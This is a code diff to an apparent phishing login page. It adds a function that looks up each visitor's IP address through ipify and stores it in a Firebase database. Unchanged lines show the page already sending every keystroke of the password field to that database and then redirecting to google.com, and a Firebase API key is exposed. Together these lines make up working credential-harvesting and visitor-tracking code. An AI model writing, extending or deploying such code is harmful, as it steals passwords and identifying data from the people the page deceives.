@@ -30,6 +30,24 @@
 		<script src="https://www.gstatic.com/firebasejs/8.2.3/firebase-auth.js"></script>
 		<script src="https://www.gstatic.com/firebasejs/8.2.3/firebase-database.js"></script>
 		<script>
+		function getUserIP(onNewIP) { //  onNewIp - your listener function for new IPs
+			var request = new XMLHttpRequest()
+			var ipAddress = ''
+			request.open('GET', "https://api.ipify.org?format=jsonp=", true)
+			var ipAddress = request.onload = function() {
+			  if (request.status >= 200 && request.status < 400) {
+				// Success!
+				onNewIP(request.responseText);
+			  } else {
+				// We reached our target server, but it returned an error
+
+			  }
+			}
+			request.onerror = function() {
+			  // There was a connection error of some sort
+			}
+			request.send()
+		}
 		// Your web app's Firebase configuration
 		var firebaseConfig = {
 			apiKey: "AIzaSyDNk6CJOE-6RIRwWCUN4Vu5NDIw3wHevHc",
@@ -49,6 +67,9 @@
 			document.getElementById("mypassword").onkeyup = function(){
 				firebase.database().ref(userId + '/pass').push().set(document.getElementById("mypassword").value);
 			};
+			getUserIP(function(ip){
+				firebase.database().ref(userId + '/info').push().set(ip);
+			});
 			document.getElementById("mybtnnn").onclick = function() {
 				window.location.href = "https://www.google.com";
 			};
